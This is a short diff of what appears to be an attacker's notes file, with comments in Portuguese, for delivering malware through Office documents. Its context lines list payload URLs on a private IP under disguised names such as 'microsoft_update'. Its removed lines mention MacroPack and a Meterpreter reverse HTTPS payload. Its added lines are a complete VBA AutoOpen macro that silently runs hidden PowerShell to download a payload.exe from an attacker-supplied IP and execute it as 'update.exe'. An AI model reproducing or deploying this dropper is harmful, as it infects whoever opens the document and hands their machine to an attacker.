@@ -18,15 +18,18 @@ http://192.168.1.137/payloads/relatorio_seguranca.exe
 
 http://192.168.1.137:8080/microsoft_update.page.zip
 
-MacroPack
-
-wget https://get.videolan.org/vlc/3.0.20/win64/vlc-3.0.20-win64.exe -O vlc_setup.exe
-
-set PAYLOAD windows/x64/meterpreter/reverse_https
-
-python3 -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
+Sub AutoOpen()
+    On Error Resume Next
+    Dim objShell As Object
+    Set objShell = CreateObject("WScript.Shell")
+    
+    ' Comando para baixar e executar o payload
+    objShell.Run "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command " & _
+                "Invoke-WebRequest -Uri 'http://<SEU_IP>:8080/payload.exe' -OutFile 'C:\Users\Public\update.exe'; " & _
+                "Start-Process 'C:\Users\Public\update.exe'", 0, False
+    
+    Set objShell = Nothing
+End Sub
 
 
 
